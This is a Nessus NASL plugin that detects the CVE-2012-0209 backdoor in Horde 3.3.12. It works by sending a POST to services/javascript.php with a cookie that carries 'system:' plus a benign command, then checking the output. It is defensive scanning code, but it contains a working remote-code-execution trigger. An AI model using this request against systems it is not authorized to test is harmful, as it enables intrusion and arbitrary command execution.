#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(58010);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2017/05/16 19:35:39 $");

  script_cve_id("CVE-2012-0209");
  script_bugtraq_id(51989);
  script_osvdb_id(79246);
  script_xref(name:"EDB-ID", value:"18492");

  script_name(english:"Horde 3.3.12 open_calendar.js Backdoor");
  script_summary(english:"Attempts to run a command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application hosted on the remote host has a code execution
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"A backdoored Horde release was detected on the remote host.  The
Horde FTP server was compromised, and backdoor code was added to allow
arbitrary PHP execution.  The backdoor reportedly was present in
versions of Horde 3.3.12 downloaded between November 15, 2011 and
February 7, 2012.

A remote, unauthenticated attacker could exploit this to execute
arbitrary PHP."
  );
  # http://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?810b9602");
  script_set_attribute(attribute:"see_also", value:"https://lists.horde.org/archives/announce/2012/000751.html");
  script_set_attribute(
    attribute:"solution",
    value:
"Reinstall one of the clean software packages referenced in the Horde
advisory for CVE-2012-0209."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Horde RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Horde 3.3.12 Backdoor Arbitrary PHP Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'White_Phosphorus');

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/02/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/02/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/02/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:horde:horde_application_framework");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2017 Tenable Network Security, Inc.");

  script_dependencies("horde_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/horde");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);
install = get_install_from_kb(appname:'horde', port:port, exit_on_fail:TRUE);

# make an educated guess about which command to run,
# unless paranoid or unable to fingerprint the OS
if (report_paranoia < 2 && (os = get_kb_item('Host/OS')))
{
  if ('Windows' >< os)
    cmds = make_list('ipconfig');
  else
    cmds = make_list('id');
}
else cmds = make_list('id', 'ipconfig');

cmd_pats['id'] = 'uid=[0-9]+.*gid=[0-9]+.*';
cmd_pats['ipconfig'] = 'Windows IP Configuration';
url = install['dir'] + '/services/javascript.php';
postdata = 'app=horde&file=open_calendar.js';
php_func = 'system';
enable_cookiejar();

foreach cmd (cmds)
{
  clear_cookiejar();
  set_http_cookie(name:'href', value:php_func + ':' + cmd);
  res = http_send_recv3(
    method:'POST',
    item:url,
    port:port,
    data:postdata,
    content_type:'application/x-www-form-urlencoded',
    exit_on_fail:TRUE
  );

  if (output = egrep(pattern:cmd_pats[cmd], string:res[2]))
  {
    if (report_verbosity > 0)
    {
      report =
        '\nNessus executed "' + cmd + '" by sending the following request :\n\n' +
        chomp(http_last_sent_request()) + '\n';

      if (report_verbosity > 1)
      {
        output = strstr(res[2], output);
        rest = strstr(output, "';");
        output -= rest;

        # strip out the leading part of the line which doesn't contain the command output (*nix)
        match = eregmatch(string:output, pattern:"link\.href = '#(.+)$");
        if (!isnull(match))
          output = match[1] + '\n';

        report += '\nWhich resulted in the following output :\n\n' + output;
      }

      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}

exit(0, 'The Horde install at ' + build_url(qs:install['dir'], port:port) + ' is not affected.');
